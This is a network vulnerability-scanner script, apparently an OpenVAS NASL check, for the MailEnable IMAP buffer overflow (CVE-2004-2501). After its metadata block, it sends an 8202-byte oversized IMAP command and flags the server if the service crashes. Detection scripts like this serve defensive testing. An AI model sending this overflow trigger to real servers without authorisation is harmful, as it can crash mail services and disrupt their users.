if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.15852" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2004-2501" );
	script_bugtraq_id( 11755 );
	script_xref( name: "OSVDB", value: "12135" );
	script_xref( name: "OSVDB", value: "12136" );
	script_name( "MailEnable IMAP Service Remote Buffer Overflows" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2004 George A. Theall" );
	script_family( "Denial of Service" );
	script_dependencies( "imap4_banner.sc" );
	script_require_ports( "Services/imap", 143 );
	script_mandatory_keys( "imap/banner/available" );
	script_xref( name: "URL", value: "http://www.mailenable.com/hotfix/default.asp" );
	script_xref( name: "URL", value: "http://www.hat-squad.com/en/000102.html" );
	script_tag( name: "solution", value: "Apply the IMAP hotfix dated 25 November 2004 and found at the references." );
	script_tag( name: "summary", value: "The target is running at least one vulnerable instance of MailEnable's IMAP
  service." );
	script_tag( name: "insight", value: "Two flaws exist in MailEnable Professional Edition 1.52 and
  earlier as well as MailEnable Enterprise Edition 1.01 and earlier - a
  stack-based buffer overflow and an object pointer overwrite." );
	script_tag( name: "impact", value: "A remote attacker can use either vulnerability to execute arbitrary code on the target." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("imap_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
port = imap_get_port( default: 143 );
banner = imap_get_banner( port: port );
if(!banner || !ContainsString( banner, "IMAP4rev1 server ready at" )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
s = recv_line( socket: soc, length: 1024 );
s = chomp( s );
if(!s || !ContainsString( s, "IMAP4rev1 server ready at" )){
	close( soc );
	exit( 0 );
}
c = NASLString( "a1 ", crap( 8202 ) );
send( socket: soc, data: NASLString( c, "\\r\\n" ) );
for(;s = recv_line( socket: soc, length: 1024 );){
	s = chomp( s );
	m = eregmatch( pattern: "^a1 (OK|BAD|NO)", string: s, icase: TRUE );
	if(!isnull( m )){
		resp = m[1];
		break;
	}
	resp = "";
}
if(!resp){
	close( soc );
	soc = open_sock_tcp( port );
	if(!soc){
		security_message( port: port );
		exit( 0 );
	}
}
c = NASLString( "a2", " LOGOUT" );
send( socket: soc, data: NASLString( c, "\\r\\n" ) );
for(;s = recv_line( socket: soc, length: 1024 );){
	s = chomp( s );
	m = eregmatch( pattern: "^a2 (OK|BAD|NO)", string: s, icase: TRUE );
	if(!isnull( m )){
		resp = m[1];
		break;
	}
}
close( soc );
exit( 99 );

